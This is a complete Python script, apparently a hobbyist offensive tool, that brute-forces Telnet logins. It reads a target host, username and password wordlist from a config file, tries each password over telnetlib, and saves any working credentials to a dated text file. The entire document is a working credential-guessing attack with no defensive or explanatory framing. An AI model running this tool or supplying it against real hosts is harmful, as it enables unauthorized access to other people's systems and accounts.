import socket, json
from datetime import date
from sys import excepthook
import telnetlib


f = open('config.json')
data = json.load(f)
host = data['host']
username = data['username']
wordlist = data['wordlist']

try:
    print ("\033[1;32;40m" + "Starting ...")
except KeyboardInterrupt as erro:
		print ("\n" + "\033[1;31;40m" + "User Cancell" + "\033[0;37;40m")

if host == "":
    print("\033[1;31;40m" + "No host set in config.json" + "\033[0;37;40m")
    exit()
elif username == "":
    print("\033[1;31;40m" + "No username set in config.json" + "\033[0;37;40m")
    exit()
elif host == "":
    print("\033[1;31;40m" + "No host set in config.json" + "\033[0;37;40m")
    exit()
elif wordlist == "":
    print("\033[1;31;40m" + "No wordlist set in config.json" + "\033[0;37;40m")
    exit()

try:
	wordlist = open(wordlist, 'r', encoding="utf-8")
except FileNotFoundError as erro:
		print("\033[1;31;40m" + "Wordlist not found" + "\033[0;37;40m")
		exit()

def attack_telnet(passwd):
	tn = telnetlib.Telnet(host)
	try:
		tn.read_until("login: ".encode('utf-8'))
	except EOFError:
		print("\033[1;31;40m" + "error: read(login) failed" + "\033[0;37;40m")
	try:
		tn.write(username.encode('utf-8') + "\n".encode('utf-8'))
	except socket.error:
		print("\033[1;31;40m" + "error: write (username) failed" + "\033[0;37;40m")
	if passwd:
		try:
			tn.read_until("Password: ".encode('utf-8'))
		except EOFError: print ("\033[1;31;40m" + "error: read (password) failed" + "\033[0;37;40m")
		try:
			tn.write(passwd.encode('utf-8') + "\n".encode('utf-8'))
		except socket.error:
			print("\033[1;31;40m" + "error: write (password) failed" + "\033[0;37;40m")
		
		try:
			(i, obj, byt) = tn.expect([b'incorrect', b'@'], 2)
		except EOFError:
			print ("Error occured")
		except KeyboardInterrupt as erro:
			print ("\n" + "\033[1;31;40m" + "User Cancell" + "\033[0;37;40m")

		try:
			if i == 1:
				return True
			tn.close()
			print ("\033[1;31;40m" + "Password incorrect" + "\n")
			return False
		except UnboundLocalError as erro:
			exit()

passwords = wordlist.readlines()
for pwd in passwords:
    passwd=pwd.strip()
    print ("\033[1;34;40m" + "Username: " + username + "\n" + "Password: " + passwd)
    if (attack_telnet(passwd)):   
        result = print("\033[1;32;40m" + "Password correct" + "\n")
        date_result = date.today()
        output = open("output_" + str(date_result) + ".txt","w+")
        output.write("Username: " + username + "\n" + "Password: " + passwd + "\n")
        output.close()
        print ("Result seved in " + "output_" + str(date_result) + ".txt" + "\033[0;37;40m")
        break

wordlist.close()
